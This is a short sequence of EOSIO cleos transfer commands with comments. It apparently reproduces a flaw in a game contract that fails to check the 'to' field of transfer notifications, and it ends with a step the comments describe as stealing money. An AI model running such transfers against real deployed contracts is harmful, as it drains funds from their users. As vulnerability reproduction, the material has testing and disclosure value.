#first variant, everything works
cleos push action eosio.token transfer '["a", "game1", "1.0000 EOS", "50"]' -p a
#oops, hack, check _to field of transfer
cleos push action eosio.token transfer '["a", "b", "1.0000 EOS", "50"]' -p a
#not hack doesn't work
cleos push action eosio.token transfer '["a", "c", "1.0000 EOS", "50"]' -p a
#and game works
cleos push action eosio.token transfer '["a", "game2", "1.0000 EOS", "50"]' -p a
#no we steal money 8)
cleos push action eosio.token transfer '["d", "game2", "1.0000 EOS", "50"]' -p d